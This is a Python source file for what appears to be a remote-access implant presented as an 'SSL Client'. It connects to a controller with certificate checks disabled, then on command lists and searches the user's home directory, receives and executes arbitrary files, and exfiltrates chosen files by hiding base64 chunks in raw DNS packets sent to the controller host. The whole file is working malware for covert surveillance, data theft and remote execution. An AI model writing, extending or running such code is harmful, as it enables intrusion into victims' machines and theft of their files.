import os
import ctypes
import sys
import zlib
import socket
import ssl
import argparse
import logging
import subprocess
from time import sleep
from pathlib import Path
from base64 import b64encode

# Constants
BUFFER_SIZE = 1024
READ_BINARY = "rb"
WRITE_BINARY = "wb"
MAX_PAYLOAD_SIZE = 76
INITIATION_STRING = "INIT_445"
DELIMITER = "::"
NULL = "\x00"
DATA_TERMINATOR = "\xcc\xcc\xcc\xcc\xff\xff\xff\xff"

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def dns_exfil(host, path_to_file, port=53, max_packet_size=128, time_delay=0.01):
    """
    Exfiltrate data over DNS to the known DNS server.
    :param host: DNS server IP
    :param path_to_file: Path to file to exfiltrate
    :param port: UDP port to direct to. Default is 53.
    :param max_packet_size: Max packet size. Default is 128.
    :param time_delay: Time delay between packets. Default is 0.01 secs.
    :return: Boolean
    """

    def build_dns(host_to_resolve):
        """
        Build a standard DNS query packet from raw.
        :param host_to_resolve: Exactly what it sounds like
        :return: The DNS Query
        """
        res = host_to_resolve.split(".")
        dns = b"\x04\x06"  # Transaction ID
        dns += b"\x01\x00"  # Flags - Standard Query
        dns += b"\x00\x01"  # Queries
        dns += b"\x00\x00"  # Responses
        dns += b"\x00\x00"  # Authorities
        dns += b"\x00\x00"  # Additional
        for part in res:
            dns += chr(len(part)).encode() + part.encode()
        dns += NULL.encode()  # Null termination. Here it's really NULL for string termination
        dns += b"\x00\x01"  # A (Host Addr), \x00\x1c for AAAA (IPv6)
        dns += b"\x00\x01"  # IN Class
        return dns

    # Read file
    try:
        with open(path_to_file, READ_BINARY) as fh:
            exfil_me = fh.read()
    except Exception as e:
        logging.error(f"Problem with reading file: {e}")
        return -1

    checksum = zlib.crc32(exfil_me)  # Calculate CRC32 for later verification

    # Try and check if you can send data
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except socket.error as msg:
        logging.error(f"Failed to create socket. Error Code: {msg[0]}, Message: {msg[1]}")
        return -1

    # Initiation packet
    dns_request = build_dns(host)  # Build the DNS Query
    head, tail = os.path.split(path_to_file)  # Get filename
    dns_request += (INITIATION_STRING + tail + DELIMITER + str(checksum) + NULL).encode()  # Extra data goes here
    addr = (host, port)  # Build address to send to
    s.sendto(dns_request, addr)

    # Sending actual file
    chunks = [exfil_me[i:i + max_packet_size] for i in range(0, len(exfil_me), max_packet_size)]  # Split into chunks
    for chunk in chunks:
        dns_request = build_dns(host)
        chunk = b64encode(chunk).decode()
        dns_request += (chunk + DATA_TERMINATOR).encode()
        s.sendto(dns_request, addr)
        sleep(time_delay)

    # Send termination packet
    dns_request = build_dns(host)
    dns_request += (DATA_TERMINATOR + NULL + DATA_TERMINATOR).encode()
    s.sendto(dns_request, addr)

    return 0

def receive_file(conn):
    """
    Receive file from server and save locally.
    :param conn: Server connection socket
    """
    try:
        save_path = conn.recv(BUFFER_SIZE).decode()
        logging.info(f"Receiving file to save as: {save_path}")
        dir_path = os.path.dirname(save_path)
        if dir_path and not os.path.exists(dir_path):
            os.makedirs(dir_path)
        with open(save_path, 'wb') as f:
            while True:
                data = conn.recv(BUFFER_SIZE)
                if data == b"!":
                    break
                f.write(data)
        logging.info(f"File received and saved as {save_path}")
    except Exception as e:
        logging.error(f"Error receiving file: {e}")

def execute_file(filename):
    """
    Execute a file on the client machine.
    :param filename: Filename of the file to execute
    """
    try:
        subprocess.run([filename], check=True)
        logging.info(f"Executed file {filename}")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to execute file {filename}: {e}")

def tree(dir_path: Path, prefix: str=''):
    """A recursive generator, given a directory Path object will yield a visual tree structure line by line."""
    space = '    '
    branch = '│   '
    tee = '├── '
    last = '└── '

    try:
        contents = [file for file in dir_path.iterdir() if not file.name.startswith(".")]
        pointers = [tee] * (len(contents) - 1) + [last]
        for pointer, path in zip(pointers, contents):
            yield prefix + pointer + path.name
            if path.is_dir():
                extension = branch if pointer == tee else space
                yield from tree(path, prefix=prefix+extension)
    except PermissionError:
        logging.error(f"Permission error for path: {dir_path}")
    except FileNotFoundError:
        logging.error(f"File not found: {dir_path}")
    except OSError as e:
        logging.error(f"OS error for path {dir_path}: {e}")

def fileinfo(dir_path: Path, prefix: str=''):
    try:
        files = [file for file in dir_path.iterdir() if not file.name.startswith(".")]
        for path in files:
            yield path
            if path.is_dir():
                yield from fileinfo(path, prefix=prefix)
    except PermissionError:
        logging.error(f"Permission error for path: {dir_path}")
    except FileNotFoundError:
        logging.error(f"File not found: {dir_path}")
    except OSError as e:
        logging.error(f"OS error for path {dir_path}: {e}")

def main():
    if not is_admin():
        logging.error("This script requires administrative privileges. Please run as an administrator.")
        sys.exit(1)

    parser = argparse.ArgumentParser(description='SSL Client')
    parser.add_argument('-H', '--host', default='localhost', help='Hostname or IP address of the server')
    parser.add_argument('-P', '--port', type=int, default=65432, help='Port number of the server')
    parser.add_argument('-cport', '--client-port', type=int, default=0, help='Port number of the client')
    parser.add_argument('-C', '--cert', default='./cert/client-cert.pem', help='Path to the client SSL certificate file')
    parser.add_argument('-K', '--key', default='./cert/client-key.pem', help='Path to the client SSL private key file')
    parser.add_argument('--ca-cert', default='./cert/ca-cert.pem', help='Path to the CA certificate file')
    args = parser.parse_args()

    # Setup SSL context
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context.load_verify_locations(args.ca_cert)
    context.load_cert_chain(certfile=args.cert, keyfile=args.key)
    context.check_hostname = False  # Disable hostname checking
    context.verify_mode = ssl.CERT_NONE  # Disable certificate verification

    try:
        # Establish SSL connection
        conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=args.host)
        if args.client_port:
            conn.bind(('0.0.0.0', args.client_port))  # Bind to the specified client port
        conn.connect((args.host, args.port))

        while True:
            # Receive action code from the server
            action = int.from_bytes(conn.recv(1), byteorder='big')
            logging.info(f"Action received: {action}")

            if action == 1:
                logging.info("Sending Tree Data")
                for line in tree(Path.home()):
                    try:
                        conn.sendall((line + "\n").encode())
                    except PermissionError:
                        logging.error(f"Permission error for path: {line}")
                        continue
                    except OSError as e:
                        logging.error(f"OS error for path {line}: {e}")
                        continue
                conn.sendall(b"!")

            elif action == 2:
                logging.info("Sending Filetypes Data")
                files_dict_type = {}
                for file in fileinfo(Path.home()):
                    if file.is_file():
                        files_dict_type[file] = file.suffix

                ordered_type = {k: v for k, v in sorted(files_dict_type.items(), key=lambda item: item[1], reverse=True)}
                for path, filetype in ordered_type.items():
                    if filetype:
                        conn.sendall((f"{path}, {filetype}\n").encode())
                conn.sendall(b"!")

            elif action == 3:
                logging.info("Sending Filesize Data")
                files_dict_size = {}
                for file in fileinfo(Path.home()):
                    if file.is_file():
                        files_dict_size[file] = file.stat().st_size

                ordered_size = {k: v for k, v in sorted(files_dict_size.items(), key=lambda item: item[1], reverse=True)}
                for path, size in ordered_size.items():
                    if size > 50000:
                        conn.sendall((f"{path}, {size}\n").encode())
                conn.sendall(b"!")

            elif action == 4:
                search_string = conn.recv(BUFFER_SIZE).decode()
                logging.info(f"Searching for: {search_string}")
                for path in fileinfo(Path.home()):
                    if search_string in str(path):
                        try:
                            conn.sendall((f"{path}\n").encode())
                        except PermissionError:
                            logging.error(f"Permission error for path: {path}")
                            continue
                        except OSError as e:
                            logging.error(f"OS error for path {path}: {e}")
                            continue
                conn.sendall(b"!")

            elif action == 5:
                file_path = conn.recv(BUFFER_SIZE).decode()
                logging.info(f"Exfiltrating file: {file_path}")
                dns_exfil(host=args.host, path_to_file=file_path)
                conn.sendall(b"!")

            elif action == 6:
                logging.info(f"Receiving file from server")
                receive_file(conn)

            elif action == 7:
                filename = conn.recv(BUFFER_SIZE).decode()
                logging.info(f"Executing file: {filename}")
                execute_file(filename)

            elif action == 8:
                break

    except ssl.SSLError as e:
        logging.error(f"SSL connection error: {e}")
    except socket.error as e:
        logging.error(f"Socket error: {e}")
    except Exception as e:
        logging.error(f"Data handling error: {e}")
    finally:
        if 'conn' in locals() and isinstance(conn, ssl.SSLSocket):
            conn.close()

if __name__ == "__main__":
    main()
